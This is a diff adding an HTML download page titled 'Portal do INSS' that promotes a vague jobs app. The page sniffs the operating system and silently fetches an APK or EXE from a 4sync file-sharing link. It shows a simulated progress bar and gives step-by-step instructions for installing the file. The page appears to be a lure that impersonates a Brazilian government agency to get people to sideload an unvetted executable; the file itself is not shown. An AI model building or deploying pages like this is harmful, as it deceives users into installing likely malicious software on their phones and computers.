@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal do INSS</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts: Poppins -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Feather Icons for the download icon -->
+    <script src="https://unpkg.com/feather-icons"></script>
+
+    <style>
+        /* Applying the Poppins font to the body */
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        }
+
+        /* Custom class for the subtle shake animation on inactive click */
+        .shake-animation {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+            transform: translate3d(0, 0, 0);
+        }
+
+        @keyframes shake {
+            10%, 90% {
+                transform: translate3d(-1px, 0, 0);
+            }
+            20%, 80% {
+                transform: translate3d(2px, 0, 0);
+            }
+            30%, 50%, 70% {
+                transform: translate3d(-3px, 0, 0);
+            }
+            40%, 60% {
+                transform: translate3d(3px, 0, 0);
+            }
+        }
+        
+        /* Glassmorphism effect for the container */
+        .card {
+             background: rgba(255, 255, 255, 0.3);
+             backdrop-filter: blur(10px);
+             border: 1px solid rgba(255, 255, 255, 0.18);
+        }
+
+    </style>
+</head>
+<body class="text-gray-800">
+
+    <div class="flex flex-col min-h-screen items-center justify-center p-4">
+        
+        <div class="w-full max-w-2xl mx-auto card rounded-2xl shadow-2xl p-8 md:p-12">
+            <!-- Header -->
+            <header class="w-full text-center mb-8">
+                <h1 class="text-3xl md:text-4xl font-bold text-blue-900">Portal de Oportunidades</h1>
+            </header>
+
+            <!-- Main Content -->
+            <main class="flex-grow flex flex-col items-center justify-center text-center space-y-8">
+                <p class="text-lg md:text-xl max-w-lg text-gray-700">
+                    Baixe nosso aplicativo e descubra uma nova forma de iniciar seu futuro profissional.
+                </p>
+
+                <!-- Download Button Container -->
+                <div class="w-full max-w-xs md:max-w-sm">
+                    <button id="downloadButton" class="w-full flex items-center justify-center bg-blue-600 text-white font-semibold text-lg py-4 px-8 rounded-xl shadow-lg hover:bg-blue-700 focus:outline-none focus:ring-4 focus:ring-blue-300 transition-all duration-300 transform hover:scale-105">
+                        <span id="buttonText">Baixar o Aplicativo</span>
+                        <i id="buttonIcon" data-feather="download-cloud" class="ml-3"></i>
+                    </button>
+                    <div id="progressContainer" class="hidden w-full bg-gray-200 rounded-lg overflow-hidden mt-4">
+                        <div id="progressBar" class="bg-blue-600 text-xs font-medium text-blue-100 text-center p-1 leading-none rounded-lg" style="width: 0%">0%</div>
+                    </div>
+                </div>
+
+                <!-- Tutorial Section -->
+                <div id="tutorial" class="mt-10 pt-8 border-t border-gray-300 w-full max-w-lg text-left">
+                    <h2 class="text-xl font-semibold text-center text-blue-900 mb-4">Como Instalar</h2>
+                    <ul id="tutorial-list" class="space-y-3 text-gray-600">
+                        <!-- Tutorial steps will be dynamically inserted here -->
+                    </ul>
+                </div>
+
+            </main>
+
+            <!-- Footer -->
+            <footer class="w-full pt-8 mt-8 text-center">
+                <p class="text-sm text-gray-500">
+                    * Compatível com Android e Windows.
+                </p>
+            </footer>
+        </div>
+    </div>
+
+    <script>
+        // --- System Detection ---
+        const isAndroid = /Android/i.test(navigator.userAgent);
+        const fileName = isAndroid ? 'App-Oportunidades.apk' : 'App-Oportunidades.exe';
+
+        // --- DOM Element Selection ---
+        const downloadButton = document.getElementById('downloadButton');
+        const buttonText = document.getElementById('buttonText');
+        const buttonIcon = document.getElementById('buttonIcon');
+        const progressContainer = document.getElementById('progressContainer');
+        const progressBar = document.getElementById('progressBar');
+        const tutorialList = document.getElementById('tutorial-list');
+
+        // --- Update UI based on system ---
+        document.addEventListener('DOMContentLoaded', () => {
+            let tutorialHTML = '';
+            if (isAndroid) {
+                tutorialHTML = `
+                    <li class="flex items-start">
+                        <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                        <span><strong class="font-semibold">Passo 1:</strong> Clique no botão acima para baixar o arquivo <code class="bg-gray-200 text-sm rounded px-1">${fileName}</code>.</span>
+                    </li>
+                    <li class="flex items-start">
+                         <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                         <span><strong class="font-semibold">Passo 2:</strong> Quando o download terminar, toque em <strong class="text-blue-600">'Abrir'</strong> na notificação que aparecerá na tela.</span>
+                    </li>
+                    <li class="flex items-start">
+                         <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                        <span><strong class="font-semibold">Alternativa:</strong> Se não vir a notificação, vá até sua pasta de 'Downloads' ou 'Meus Arquivos' e toque no arquivo para instalar.</span>
+                    </li>
+                `;
+            } else {
+                 tutorialHTML = `
+                    <li class="flex items-start">
+                        <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                        <span><strong class="font-semibold">Passo 1:</strong> Clique no botão acima para iniciar o download do nosso aplicativo.</span>
+                    </li>
+                    <li class="flex items-start">
+                         <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                         <span><strong class="font-semibold">Passo 2:</strong> Após baixar, encontre o arquivo <code class="bg-gray-200 text-sm rounded px-1">${fileName}</code> na sua pasta de Downloads.</span>
+                    </li>
+                    <li class="flex items-start">
+                         <i data-feather="check-circle" class="text-green-500 mr-3 mt-1 flex-shrink-0"></i>
+                        <span><strong class="font-semibold">Passo 3:</strong> Dê um duplo clique no arquivo para instalar e comece a explorar as vagas.</span>
+                    </li>
+                `;
+            }
+            tutorialList.innerHTML = tutorialHTML;
+            feather.replace(); // Re-render icons after adding them dynamically
+        });
+        
+        // --- State Management ---
+        let isDownloading = false;
+        let isInactive = false;
+
+        // --- Event Listener ---
+        downloadButton.addEventListener('click', () => {
+            if (isDownloading || isInactive) {
+                if(isInactive) {
+                    downloadButton.classList.add('shake-animation');
+                    setTimeout(() => {
+                        downloadButton.classList.remove('shake-animation');
+                    }, 500);
+                }
+                return;
+            }
+            startDownload();
+        });
+
+        // --- Core Functions ---
+        function startDownload() {
+            isDownloading = true;
+
+            // 1. Start the actual file download from the provided URL
+            const downloadUrl = 'https://www.4sync.com/web/directDownload/CLhHEZN5/jsXUySnb.15199c68cf6992ed93b1b24c89ce2258';
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = downloadUrl;
+            // The 'download' attribute suggests a filename. The browser and server will determine the final name.
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            
+            // 2. Update UI to show progress (simulation)
+            buttonText.textContent = 'Baixando o app...';
+            downloadButton.classList.remove('hover:bg-blue-700', 'hover:scale-105');
+            downloadButton.classList.add('cursor-not-allowed', 'bg-blue-800');
+            buttonIcon.style.display = 'none';
+            progressContainer.classList.remove('hidden');
+
+            // 3. Simulate progress bar
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 10) + 5;
+                if (progress > 100) progress = 100;
+                
+                progressBar.style.width = progress + '%';
+                progressBar.textContent = progress + '%';
+                
+                if (progress === 100) {
+                    clearInterval(interval);
+                    completeDownload();
+                }
+            }, 250);
+        }
+
+        function completeDownload() {
+            isDownloading = false;
+            isInactive = true;
+            
+            // Customized completion message based on OS
+            const completionMessage = isAndroid 
+                ? "Pronto! Toque em 'Abrir' ou procure nos Downloads."
+                : "Pronto! Procure na pasta de Downloads para instalar.";
+            
+            buttonText.textContent = completionMessage;
+            buttonText.classList.add('text-sm');
+            downloadButton.classList.remove('bg-blue-800');
+            downloadButton.classList.add('bg-green-600');
+            
+            setTimeout(() => {
+                 progressContainer.classList.add('hidden');
+            }, 1000);
+
+            setTimeout(resetButton, 30000);
+        }
+        
+        function resetButton() {
+            isInactive = false;
+            
+            buttonText.textContent = 'Baixar o App Novamente';
+            buttonText.classList.remove('text-sm');
+            downloadButton.classList.remove('cursor-not-allowed', 'bg-green-600');
+            downloadButton.classList.add('hover:bg-blue-700', 'hover:scale-105', 'bg-blue-600');
+            buttonIcon.style.display = 'inline-block';
+            progressBar.style.width = '0%';
+            progressBar.textContent = '0%';
+        }
+        
+        // Initial call is now handled inside the DOMContentLoaded listener
+    </script>
+</body>
+</html>
